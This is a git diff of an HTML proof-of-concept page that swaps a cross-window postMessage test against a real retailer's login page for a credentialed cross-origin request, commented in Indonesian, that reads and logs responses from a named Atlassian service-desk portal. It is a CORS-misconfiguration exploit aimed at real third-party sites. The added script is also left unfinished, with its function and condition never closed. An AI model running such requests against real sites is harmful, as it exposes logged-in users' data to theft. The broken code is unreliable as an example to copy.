@@ -8,16 +8,22 @@
             </head>
             <body>
             <script>
-                    function pocLink() {
-                        let win = window.open('https://ae.loccitane.com/en/login');
-                        let msg = "bismillah";
-                        
-                        setTimeout(function(){
-                            win.postMessage(msg, '*');
-                        }, 5000);
-                    }
-                </script>
-               <button onclick='pocLink()'>klik saja</button>               
+                 // 1. Inisialisasi objek XMLHttpRequest
+const xhr = new XMLHttpRequest();
+
+// 2. Konfigurasi permintaan (Method, URL, Asynchronous)
+const url = 'https://clearme.atlassian.net/servicedesk/customer/portals';
+xhr.open('GET', url, true);
+
+// 3. WAJIB: Sertakan cookie dan header autentikasi dalam permintaan CORS
+xhr.withCredentials = true;
+
+// 4. Atur apa yang terjadi saat respons selesai dimuat
+xhr.onload = function() {
+    if (xhr.status >= 200 && xhr.status < 300) {
+        // Berhasil mendapatkan respons
+        console.log('Sukses:', xhr.responseText);
+                </script>             
             </body>
         </html>
         
